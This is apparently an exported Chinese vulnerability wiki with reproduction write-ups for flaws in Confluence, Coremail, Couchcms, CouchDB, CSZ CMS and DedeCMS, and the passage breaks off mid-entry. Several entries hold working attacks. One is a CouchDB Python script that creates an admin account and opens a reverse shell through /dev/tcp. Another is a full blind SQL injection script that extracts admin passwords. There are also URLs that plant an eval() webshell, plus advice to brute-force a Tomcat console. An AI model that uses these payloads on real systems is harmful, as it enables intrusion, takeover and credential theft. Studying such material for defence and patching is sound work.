/plugins/drag-and-drop/upload.action?pageId=65601&filename=../../../../../../Users/xxx/repos/atlassian-confluence-6.13.0/confluence/admin/cqq2.jsp&size=754&minorEdit=true&spaceKey=ADMIN&mimeType=application%2Foctet-stream&atl_token=47ae1afbc53f1ed100a4c36053de2d754d48ffeb&contentType=page&isVFMSupported=true&name=cqq2.jsp先将webshell上传上去，其内容会出现在confluence的安装目录，即/Users/xxx/confluenceHome。注意上传的时候的size参数需与Content-Length值保持一致，服务端会对这个做校验，若发现不一致，则会导致500。在UploadAction#execute下断点 confluence/WEB-INF/atlassian-bundled-plugins/confluence-drag-and-drop-6.13.0.jar!/com/atlassian/confluence/plugins/dragdrop/UploadAction.class 通过 InputStream inStream = this.getStreamForEncoding(this.httpServletRequest); this.fileUploadManager.storeResource(new InputStreamAttachmentResource(inStream, this.filename, this.mimeType, this.size, (String)null, this.minorEdit), (ContentEntityObject)content); 将POST的内容写入到缓存文件中：attachments/ver003//56/98/98306/101/65/65601/917509/1，3.pngfilename值没有对../进行过滤。44.png上传完成之后，打开\"全部附件\"页面，会出现我们刚刚上传上去的文件，其文件名没有对../进行过滤。5.png 2、GET /pages/downloadallattachments.action?pageId=65601然后通过这个GET请求，触发将缓存的webshell内容写入指定的路径操作。在DownloadAllAttachmentsOnPageAction#execute下断点 confluence/WEB-INF/lib/confluence-6.13.0.jar!com/atlassian/confluence/pages/actions/DownloadAllAttachmentsOnPageAction.class 文件内容： public String execute() throws Exception { List latestAttachments = this.attachmentManager.getLatestVersionsOfAttachments(this.getPage()); Iterator var2 = latestAttachments.iterator(); while(var2.hasNext()) { Attachment attachment = (Attachment)var2.next(); File tmpFile = new File(this.getTempDirectoryForZipping(), attachment.getFileName()); InputStream inputStream = this.attachmentManager.getAttachmentData(attachment); Throwable var6 = null; try { OutputStream fileOutputStream = new FileOutputStream(tmpFile); // tmpFile内容为/Users/Xxx/repos/confluenceRepos/temp/download8gHGV130701/../../../../../../Users/Xxx/repos/atlassian-confluence-6.13.0/confluence/admin/cmd222.jsp Throwable var8 = null; try { ByteStreams.copy(inputStream, fileOutputStream); //将缓存文件写入指定的路径 } catch (Throwable var31) { var8 = var31; throw var31; } finally { if (fileOutputStream != null) { if (var8 != null) { try { fileOutputStream.close(); } catch (Throwable var30) { var8.addSuppressed(var30); } } else { fileOutputStream.close(); } } } } catch (Throwable var33) { var6 = var33; throw var33; } finally { if (inputStream != null) { if (var6 != null) { try { inputStream.close(); } catch (Throwable var29) { var6.addSuppressed(var29); } } else { inputStream.close(); } } } } //在confluence安装路径的temp目录下生成zip文件。 File zipFile = new File(this.getConfluenceTempDirectoryPath() + File.separator + this.getZipFilename() + \".zip\"); FileUtils.createZipFile(this.getTempDirectoryForZipping(), zipFile); FileUtils.deleteDir(this.getTempDirectoryForZipping()); this.downloadPath = this.prepareDownloadPath(zipFile.getPath()) + \"?contentType=application/zip\"; this.gateKeeper.addKey(this.prepareDownloadPath(zipFile.getPath()), this.getAuthenticatedUser()); return \"success\"; } 先拿到Attachement列表 List latestAttachments = this.attachmentManager.getLatestVersionsOfAttachments(this.getPage()); 然后对列表中每个附件进行遍历，从最前面的开始， 然后通过666.png attachment.getFileName()) 获得附件的名字（这里有我们之前设置好的payload文件名）然后执行 ByteStreams.copy(inputStream, fileOutputStream); 将之前缓存的上传文件copy到通过请求参数filename指定的路径下，实现路径穿越。7.png执行前后对比如下：8.png对比缓存文件和在指定路径生成的文件的sha1值对比：一致。9.pngConfluence本身就可以上传任意文件内容到服务端，但是会放在缓存目录下，文件路径不可控。关键地是，没有对filename请求参数进行过滤，有路径穿越漏洞，才能将指定文件名指定文件内容写入到文件系统中。 参考链接 https://xz.aliyun.com/t/4854 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:51 "},"Web安全/Coremail/Coremail邮箱系统 目录穿越泄漏后台漏洞/Coremail邮箱系统 目录穿越泄漏后台漏洞.html":{"url":"Web安全/Coremail/Coremail邮箱系统 目录穿越泄漏后台漏洞/Coremail邮箱系统 目录穿越泄漏后台漏洞.html","title":"Coremail邮箱系统 目录穿越泄漏后台漏洞","keywords":"","body":"Coremail邮箱系统 目录穿越泄漏后台漏洞 漏洞复现 POC:url+/lunkr/cache/;/;/../../manager.html 访问过去会直接跳转到tomcat控制台，这里你就可以采用coremail/coremail弱口令尝试登陆，或者暴力破解。然后就是部署war包Getshell就ok了。 修复建议：对外隐藏tomcat控制台，修改默认口令。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:51 "},"Web安全/Coremail/Coremail配置文件信息泄漏/Coremail配置文件信息泄漏.html":{"url":"Web安全/Coremail/Coremail配置文件信息泄漏/Coremail配置文件信息泄漏.html","title":"Coremail配置文件信息泄漏","keywords":"","body":"Coremail配置文件信息泄漏 一、漏洞简介 Coremail论客邮件系统开始研发于1999年，是中国第一套中文邮件系统，目前在中国大陆地区拥有超过10亿终端用户，是网易、中华网等运营商至今一直使用的邮件系统，也是政府、事业单位、科教、企业等机构广泛使用的邮件系统。 2019年6月，网上流传出Coremail论客邮件系统配置文件泄露的漏洞，该漏洞无需认证即可获取邮件系统的配置文件内容。 Coremail官网发布的漏洞公告：《关于Coremail邮件系统安全问题的情况说明》，http://www.coremail.cn/About/news\\_x/article\\_id/32641.htm 二、漏洞影响 Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞 三、复现过程 POC http://mail.0-sec.org/mailsms/s?func=ADMIN:appState&dumpConfig=/ 输入Poc访问漏洞页面发现信息泄露页面内搜索user，password，database等关键字如下图 四、修复建议 1、在不影响使用的情况下，仅允许VPN连接后才可访问； 2、在Web服务器（nginx/apache）上限制外网对 /mailsms 路径的访问。建议使用Coremail构建邮件服务器的信息系统运营者立即自查，发现存在漏洞后及时修复。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:52 "},"Web安全/Couchcms/（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞/（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞.html":{"url":"Web安全/Couchcms/（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞/（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞.html","title":"（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞","keywords":"","body":"（CVE-2018-7662）Couchcms 2.0 存在路径泄露漏洞 一、漏洞简介 Couch through 2.0存在路径泄露漏洞，当访问特定url时系统返回的报错信息中暴露物理路径信息。Couch through是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过issues告知作者。 二、漏洞影响 Couch through 2.0 三、复现过程 poc 访问如下页面，报错信息中显示完整物理路径信息。 http://www.0-sec.org/includes/mysql2i/mysql2i.func.php http://www.0-sec.org/addons/phpmailer/phpmailer.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:53 "},"Web安全/CouchDB/（CVE-2017-12635）Couchdb 垂直权限绕过漏洞/（CVE-2017-12635）Couchdb 垂直权限绕过漏洞.html":{"url":"Web安全/CouchDB/（CVE-2017-12635）Couchdb 垂直权限绕过漏洞/（CVE-2017-12635）Couchdb 垂直权限绕过漏洞.html","title":"（CVE-2017-12635）Couchdb 垂直权限绕过漏洞","keywords":"","body":"（CVE-2017-12635）Couchdb 垂直权限绕过漏洞 一、漏洞简介 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 二、漏洞影响 小于 1.7.0 以及 小于 2.1.1 三、复现过程 环境搭建 docker-compose build docker-compose up -d 环境启动后，访问http://www.0-sec.org:5984/_utils/即可看到一个web页面，说明Couchdb已成功启动。但我们不知道密码，无法登陆。 漏洞复现 首先，发送如下数据包： PUT /_users/org.couchdb.user:vulhub HTTP/1.1 Host: www.0-sec.org:5984 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 90 { \"type\": \"user\", \"name\": \"vulhub\", \"roles\": [\"_admin\"], \"password\": \"vulhub\" } 可见，返回403错误：{\"error\":\"forbidden\",\"reason\":\"Only _admin may set roles\"}，只有管理员才能设置Role角色： Couchdb垂直权限绕过漏洞/media/rId26.png) 发送包含两个roles的数据包，即可绕过限制： PUT /_users/org.couchdb.user:vulhub HTTP/1.1 Host: www.0-sec.org:5984 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 108 { \"type\": \"user\", \"name\": \"vulhub\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"vulhub\" } 成功创建管理员，账户密码均为vulhub： Couchdb垂直权限绕过漏洞/media/rId27.png) 再次访问http://www.0-sec.org:5984/_utils/，输入账户密码vulhub，可以成功登录： Couchdb垂直权限绕过漏洞/media/rId28.png) 参考链接 https://vulhub.org/\\#/environments/couchdb/CVE-2017-12635/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:54 "},"Web安全/CouchDB/（CVE-2017-12636）Couchdb 任意命令执行漏洞/（CVE-2017-12636）Couchdb 任意命令执行漏洞.html":{"url":"Web安全/CouchDB/（CVE-2017-12636）Couchdb 任意命令执行漏洞/（CVE-2017-12636）Couchdb 任意命令执行漏洞.html","title":"（CVE-2017-12636）Couchdb 任意命令执行漏洞","keywords":"","body":"（CVE-2017-12636）Couchdb 任意命令执行漏洞 一、漏洞简介 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。 二、漏洞影响 小于 1.7.0 以及 小于 2.1.1 三、复现过程 环境搭建 Couchdb 2.x和和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。本环境启动的是1.6.0版本，如果你想测试2.1.0版本，可以启动CVE-2017-12635附带的环境。 执行如下命令启动Couchdb 1.6.0环境： docker-compose up -d 启动完成后，访问http://www.0-sec.org:5984/即可看到Couchdb的欢迎页面。 漏洞复现 该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。 1.6.0 下的说明 依次执行如下请求即可触发任意命令执行： curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/_config/query_servers/cmd' -d '\"id >/tmp/success\"' curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/vultest' curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' curl -X POST 'http://vulhub:vulhub@www.0-sec.org:5984/vultest/_temp_view?limit=10' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type:application/json' 其中,vulhub:vulhub为管理员账号密码。 第一个请求是添加一个名字为cmd的query_servers，其值为\"id >/tmp/success\"，这就是我们后面待执行的命令。 第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。 第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。 2.1.0 下的说明 2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。 Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/_membership即可： curl http://vulhub:vulhub@www.0-sec.org:5984/_membership Couchdb任意命令执行漏洞/media/rId29.png) 可见，我们这里只有一个node，名字是nonode@nohost。 然后，我们修改nonode@nohost的配置： curl -X PUT http://vulhub:vulhub@www.0-sec.org:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id >/tmp/success\"' Couchdb任意命令执行漏洞/media/rId30.png) 然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document： curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/vultest' curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view： curl -X PUT http://vulhub:vulhub@www.0-sec.org:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}' -H \"Content-Type: application/json\" 增加_view的同时即触发了query_servers中的命令。 poc 修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本（1或2），成功反弹shell： Couchdb任意命令执行漏洞/media/rId32.png) #!/usr/bin/env python3 import requests import json import base64 from requests.auth import HTTPBasicAuth target = 'http://your-ip:5984' command = rb\"\"\"sh -i >& /dev/tcp/10.0.0.1/443 0>&1\"\"\" version = 1 session = requests.session() session.headers = { 'Content-Type': 'application/json' } # session.proxies = { # 'http': 'http://127.0.0.1:8085' # } session.put(target + '/_users/org.couchdb.user:wooyun', data='''{ \"type\": \"user\", \"name\": \"wooyun\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"wooyun\" }''') session.auth = HTTPBasicAuth('wooyun', 'wooyun') command = \"bash -c '{echo,%s}|{base64,-d}|{bash,-i}'\" % base64.b64encode(command).decode() if version == 1: session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command)) else: host = session.get(target + '/_membership').json()['all_nodes'][0] session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command)) session.put(target + '/wooyun') session.put(target + '/wooyun/test', data='{\"_id\": \"wooyuntest\"}') if version == 1: session.post(target + '/wooyun/_temp_view?limit=10', data='{\"language\":\"cmd\",\"map\":\"\"}') else: session.put(target + '/wooyun/_design/test', data='{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}') 参考链接 https://vulhub.org/\\#/environments/couchdb/CVE-2017-12636/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:55 "},"Web安全/CSZ CMS/（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞/（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞.html":{"url":"Web安全/CSZ CMS/（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞/（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞.html","title":"（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞","keywords":"","body":"（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞 一、漏洞简介 CSZ CMS是一套基于PHP的开源内容管理系统（CMS）。 CSZ CMS 1.2.2版本（2019-06-20之前）中的core/MY_Security.php文件存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 二、漏洞影响 CSZ CMS 1.2.2版本（2019-06-20之前） 三、复现过程 poc import requests import time import threading import multiprocessing pool=\"admin$ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+\" \"+\"bcefghjklopqrstuvwxyz1234567890/.\" mutex=0 #获取长度用的User-Agent模板 ual=\"'-(if((length((select name from user_admin limit 1))=10),sleep(5),1))-'', '127.0.0.1','time') #\" #\"Why don't you just build something\" #----------------------------------------------------获取管理员用户名长度-------------------------------------------- def getlength(field,tbname,total): ual_head=\"'-(if((length((select \" #这些空格一定要保留 ual_middle=\" limit 1))=\" num=1 ual_last=\"),sleep(5),1))-'', '127.0.0.1','time') #\" datas={'email':'111@111.com', 'password':'111' } header={'Host': 'localhost', 'Content-Length': '74', 'Cache-Control': 'max-age=0', 'Origin': 'http://localhost', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ual, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': 'http://localhost/cszcms/member/login', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Connection': 'close'} starttime=time.time() for num in range(total): header['User-Agent']=ual_head+field+\" from \"+tbname+ual_middle+str(num)+ual_last #print(header['User-Agent']) sendtime=time.time() response=requests.post(r\"http://localhost/cszcms/member/login/check/post\",data=datas,headers=header) recvtime=time.time() doesitwork=recvtime-sendtime if(doesitwork>5): print(\"The length is\",num) print(\"This step cost:\",time.time()-starttime) return num break if(num==total-1): return 0 #获取内容用的User-Agent模板 ua=\"'-(if((ascii(substr((select name from user_admin limit 1), 1, 1))=97),sleep(5),1))-'', '127.0.0.1','time') #\" #-----------------------------------------------------获取管理员用户名-------------------------------------------- def getcontent(field,tbname,num,qr,lock): #print(num) pool=\"@.tescomadin$ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+\" \"+\"bcefghjklpqrstuvwxyz1234567890/.\" result=[] ua_head=\"'-(if((ascii(substr((select \" ua_front=\" limit 1), \" ua_middle=\", 1))=\" char=\"A\" ua_last=\"),sleep(5),1))-'', '127.0.0.1','time') #\" datas={'email':'111@111.com', 'password':'111' } header={'Host': 'localhost', 'Content-Length': '74', 'Cache-Control': 'max-age=0', 'Origin': 'http://localhost', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': 'http://localhost/cszcms/member/login', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Connection': 'close'} for i in range(1): for char in pool: header['User-Agent']=ua_head+field+\" from \"+tbname+ua_front+str(num+1)+ua_middle+str(ord(char))+ua_last #print(header['User-Agent']) lock.acquire() sendtime=time.time() response=requests.post(r\"http://localhost/cszcms/member/login/check/post\",data=datas,headers=header) lock.release() recvtime=time.time() doesitwork=recvtime-sendtime if(doesitwork>5): #print(\"It cost:\",doesitwork) print(num,\" got:\",char) #adminnamelist[num]=char result=[num,char] qr.put(result) break #---------------------------------------------现在！让我们重新揭起救世的大旗！------------------------------------ if __name__=='__main__': qr=multiprocessing.Queue() lock=multiprocessing.Lock() field=\"password\" tbname=\"user_admin\" adminname=\"\" adminpwd=\"\" getresult=[] #调用获得长度的函数 length=getlength(field,tbname,100) print(\"length is\",length) processes=[] #开线程分别对每个字符匹配 timehead=time.time() for ti in range(length): processes.append(multiprocessing.Process(target=getcontent,args=(field,tbname,ti,qr,lock))) processes[ti].start() for ti in range(length): processes[ti].join() fout=open(field+\"out.txt\",\"w+\") for ci in range(length): getresult.append(qr.get()) print(getresult) for ci in range(length): for result in getresult: if(result[0]==ci): print(result[1]) adminname+=result[1] fout.write(adminname) print(field,\":\",adminname) fout.close() print(\"It took:\",time.time()-timehead) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:57 "},"Web安全/CSZ CMS/CSZ CMS 1.2.7 储存型xss/CSZ CMS 1.2.7 储存型xss.html":{"url":"Web安全/CSZ CMS/CSZ CMS 1.2.7 储存型xss/CSZ CMS 1.2.7 储存型xss.html","title":"CSZ CMS 1.2.7 储存型xss","keywords":"","body":"CSZ CMS 1.2.7 储存型xss 一、漏洞简介 拥有访问私有消息的未授权用户可以向管理面板嵌入Javascript代码。 二、漏洞影响 CSZ CMS 1.2.7 三、复现过程 漏洞分析 查看数据库中的email_logs可知，将访问的user-agent存储到了数据库中1.png 我们首先观察路由，漏洞点在/member/insertpm页面，查看控制器，找到cszcms/controllers/Member.php 2.png找到insertpm方法： 3.png关注点在下半部分： $this->input->post即是调用的system/core/Input.php的post方法： 4.png当$xss_clean的参数设置为true，则会进行xss过滤，这也是为什么发送信息处并没有出现xss 继续看，$this->Csz_auth_model->send_pm方法位于cszcms/models/Csz_auth_model.php中的send_pm(): /** * Send multiple Private Messages * Send multiple private messages to another users * * @param array $receiver_ids Array of User ids of private message receiver * @param string $title Title/subject * @param string $message Message * @param int $sender_id User id of private message sender * @param string $re_message Reply the original message * * @return array/bool Array with User ID's as key and TRUE or a specific error message OR FALSE if sender doesn't exist */ public function send_pm($receiver_ids, $title, $message, $sender_id = '', $re_message = '') { if (!$sender_id) { $sender_id = $this->session->userdata('user_admin_id'); } if ($sender_id && (!$this->is_useractive($sender_id))) { return FALSE; }else{ if ($receiver_ids && is_numeric($receiver_ids) && $sender_id != $receiver_ids) { if($re_message){ $message = '{[' . str_replace(\"\\r\\n\" . \"\\r\\n\", \"\\r\\n\", $re_message) . \"]} \" . \"\\r\\n\" . \"\\r\\n\" . $message; } $data = array( 'sender_id' => $sender_id, 'receiver_id' => $receiver_ids, 'title' => $title, 'message' => $message, 'date_sent' => date('Y-m-d H:i:s') ); $this->db->insert('user_pms', $data); $sender_user = $this->Csz_admin_model->getUser($sender_id); $receive_user = $this->Csz_admin_model->getUser($receiver_ids); if($receive_user->pm_sendmail == '1'){ $config = $this->Csz_model->load_config(); $message_html = 'Dear ' . $receive_user->name . ',' . $message . 'Best Regards,'.$sender_user->name; @$this->Csz_model->sendEmail($receive_user->email, '[PM] ' . $title . ' ('.$config->site_name.')', $message_html, $sender_user->email, $sender_user->name); } return TRUE; }else{ return FALSE; } } } 调用了@$this->Csz_model->sendEmail方法，位于cszcms/models/Csz_model.php，我们继续跟进： public function sendEmail($to_email, $subject, $message, $from_email, $from_name = '', $bcc = '', $reply_to = '', $alt_message = '', $attach_file = array(), $save_log = TRUE) { $this->load->library('email'); $load_conf = $this->load_config(); $protocal = $load_conf->email_protocal; if (!$protocal) { $protocal = 'mail'; } $config = array(); $config['useragent'] = $this->Csz_admin_model->cszGenerateMeta(); $config['protocol'] = $protocal; /* mail, sendmail, smtp */ if ($protocal == 'smtp') { $config['smtp_host'] = $load_conf->smtp_host; $config['smtp_user'] = $load_conf->smtp_user; $config['smtp_pass'] = $load_conf->smtp_pass; $config['smtp_port'] = $load_conf->smtp_port; } else if ($protocal == 'sendmail' && $load_conf->sendmail_path) { $config['mailpath'] = $load_conf->sendmail_path; } $config['mailtype'] = 'html'; $config['charset'] = 'utf-8'; $config['wordwrap'] = TRUE; $this->email->initialize($config); $this->email->set_newline(\"\\r\\n\"); $this->email->from($from_email, $from_name); // change it to yours $this->email->to($to_email); // change it to yours $this->email->subject($subject); $this->email->message($message); if ($bcc) { $this->email->bcc($bcc); } if($reply_to){ $this->email->reply_to($reply_to); } if ($alt_message) { $this->email->set_alt_message($alt_message); } if (is_array($attach_file) && !empty($attach_file)) { foreach ($attach_file as $value) { $this->email->attach($value, 'attachment'); } } if ($this->email->send()) { $result = 'success'; } else { $result = $this->email->print_debugger(FALSE); } if($save_log === TRUE && $load_conf->email_logs == 1){ $data = array( 'to_email' => $to_email, 'from_email' => $from_email, 'from_name' => $from_name, 'subject' => $subject, 'message' => $message, 'email_result' => $result, ); $this->db->set('user_agent', $this->input->user_agent(), TRUE); $this->db->set('ip_address', $this->input->ip_address(), TRUE); $this->db->set('timestamp_create', $this->timeNow(), TRUE); $this->db->insert('email_logs', $data); $this->db->cache_delete_all(); unset($data); } unset($to_email, $subject, $message, $from_email, $from_name, $bcc, $reply_to, $alt_message, $attach_file, $save_log, $config, $load_conf, $protocal); return $result; } 关键就在于后面的数据库操作： $this->db->set('user_agent', $this->input->user_agent(), TRUE); $this->db->set('ip_address', $this->input->ip_address(), TRUE); $this->db->set('timestamp_create', $this->timeNow(), TRUE); $this->db->insert('email_logs', $data); $this->db->cache_delete_all(); $this->db->set方法位于：system/database/DB_query_builder.php： /** * The \"set\" function. * * Allows key/value pairs to be set for inserting or updating * * @param mixed * @param string * @param bool * @return CI_DB_query_builder */ public function set($key, $value = '', $escape = NULL) { $key = $this->_object_to_array($key); if ( ! is_array($key)) { $key = array($key => $value); } is_bool($escape) OR $escape = $this->_protect_identifiers; foreach ($key as $k => $v) { $this->qb_set[$this->protect_identifiers($k, FALSE, $escape)] = ($escape) ? $this->escape($v) : $v; } return $this; } 简单理解即为插入或更新值作初始化 继续，$this->input->user_agent()位于：system/core/Input.php，其具体实现如下： /** * Fetch User Agent string * * @return string|null User Agent string or NULL if it doesn't exist */ public function user_agent($xss_clean = NULL) { return $this->_fetch_from_array($_SERVER, 'HTTP_USER_AGENT', $xss_clean); } 这里的xss过滤操作默认是null，也就是没有过滤 这就是问题所在，我们即可以通过篡改user_agent的值实现xss，往下看，$this->db->insert('email_logs', $data)即向emali_logs表插入数据，$this->db->insert实现如下（system/core/Input.php）： /** * Insert * * Compiles an insert string and runs the query * * @param string the table to insert data into * @param array an associative array of insert values * @param bool $escape Whether to escape values and identifiers * @return bool TRUE on success, FALSE on failure */ public function insert($table = '', $set = NULL, $escape = NULL) { if ($set !== NULL) { $this->set($set, '', $escape); } if ($this->_validate_insert($table) === FALSE) { return FALSE; } $sql = $this->_insert( $this->protect_identifiers( $this->qb_from[0], TRUE, $escape, FALSE ), array_keys($this->qb_set), array_values($this->qb_set) ); $this->_reset_write(); return $this->query($sql); } 依然没有任何过滤 然而，关于为什么登入后台即会弹窗，搜索一番后发现，开发者直接将其echo出来（cszcms/views/admin/home.php）： 5.png 6.png 漏洞复现 新建一个用户1.png 点击inbox发送私信，选定管理员用户 2.png修改User-Agent为alert(1)3.png 管理员登陆后台即触发xss4.png 参考链接 https://xz.aliyun.com/t/7730\\#toc-6 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:56 "},"Web安全/Dedecms/（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞/（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞.html":{"url":"Web安全/Dedecms/（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞/（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞.html","title":"（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞","keywords":"","body":"（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞 一、漏洞简介 DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell 二、漏洞影响 三、复现过程 需要登录后台 根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件 DedeCMSV5.7SP2存在代码执行漏洞/media/rId24.png) 代码分析 (1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步 (2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。 (3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html* [a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\\.意思是匹配小数点 所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。 (4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec (5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用 (6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施， 导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了 根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。 漏洞复现 获取token http://0-sec.org/dede/tpl.php?action=upload DedeCMSV5.7SP2存在代码执行漏洞/media/rId27.png) 然后查看网页源代码，找到token DedeCMSV5.7SP2存在代码执行漏洞/media/rId28.png) 构造payload如下 http://0-sec.org/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token) 访问了成功写入 DedeCMSV5.7SP2存在代码执行漏洞/media/rId29.png) 访问写入的文件 http://0-sec.org/include/taglib/（你上传的文件名）.lib.php DedeCMSV5.7SP2存在代码执行漏洞/media/rId30.png) 也可以构造一句话木马payload http://0-sec.org/dede5.7/dede/tpl.php?filename=caidao.lib.php&action=savetagfile&content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&token=2d7ef87e9828edaad2d7b6bbe37f1929 DedeCMSV5.7SP2存在代码执行漏洞/media/rId31.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:07 "},"Web安全/Dedecms/（CVE-2018-9175）Dedecms V5.7后台的两处getshell/（CVE-2018-9175）Dedecms V5.7后台的两处getshell.html":{"url":"Web安全/Dedecms/（CVE-2018-9175）Dedecms V5.7后台的两处getshell/（CVE-2018-9175）Dedecms V5.7后台的两处getshell.html","title":"（CVE-2018-9175）Dedecms V5.7后台的两处getshell","keywords":"","body":"（CVE-2018-9175）Dedecms V5.7后台的两处getshell 一、漏洞简介 后台写配置文件过滤不足导致写shell。 二、漏洞影响 三、复现过程 漏洞代码分析 第一个 在/dede/sys_verifies.php中的第152行处 else if ($action == 'getfiles') { if(!isset($refiles)) { ShowMsg(\"你没进行任何操作！\",\"sys_verifies.php\"); exit(); } $cacheFiles = DEDEDATA.'/modifytmp.inc'; $fp = fopen($cacheFiles, 'w'); fwrite($fp, ''); fclose($fp); 可以看到，这里会将$refiles数组中的内容写入配置文件modifytmp.inc中。 dedecms对于输入是全局过滤的，在/common.inc.php中注册并过滤了外部提交的变量 function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && 